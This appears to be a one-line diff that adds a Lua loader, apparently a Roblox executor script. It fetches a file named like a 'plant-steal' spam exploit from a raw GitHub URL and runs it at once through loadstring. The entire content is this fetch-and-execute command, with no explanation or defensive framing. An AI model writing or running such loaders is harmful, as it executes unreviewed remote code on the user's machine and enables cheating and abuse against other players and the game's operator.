@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/plant-steal-co-op-spam3-71ay85wfjqmuvt.lua"))()
